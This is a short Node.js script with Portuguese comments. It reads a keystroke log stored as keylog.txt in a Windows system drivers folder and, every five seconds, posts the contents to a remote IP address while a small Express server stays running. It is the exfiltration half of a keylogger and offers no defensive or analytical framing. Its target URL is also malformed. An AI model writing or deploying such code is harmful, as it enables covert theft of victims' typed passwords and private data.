const express = require('express');
const fs = require('fs');
const axios = require('axios');

const app = express();
const port = 3000;

const filePath = "C:\\Windows\\System32\\drivers\\keylog.txt"; // Substitua com o caminho do seu arquivo

// Função para enviar o conteúdo do arquivo para o servidor remoto
function sendFileContent() {
    // Lê o conteúdo do arquivo
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Erro ao ler o arquivo:', err);
            return;
        }

        // Envia o conteúdo para o servidor remoto
        axios.post('http://10.112.80.190/24:3000', { content: data })
            .then(response => {
                console.log('Conteúdo enviado com sucesso:', response.data);
            })
            .catch(error => {
                console.error('Erro ao enviar o conteúdo:', error);
            });
    });
}

// Envia o conteúdo a cada 5 segundos (5000 ms)
setInterval(sendFileContent, 5000);

// Rota simples para verificar se o servidor de envio está rodando
app.get('/', (req, res) => {
    res.send('Servidor de envio funcionando');
});

app.listen(port, () => {
    console.log(`Servidor de envio rodando em http://localhost:${port}`);
});
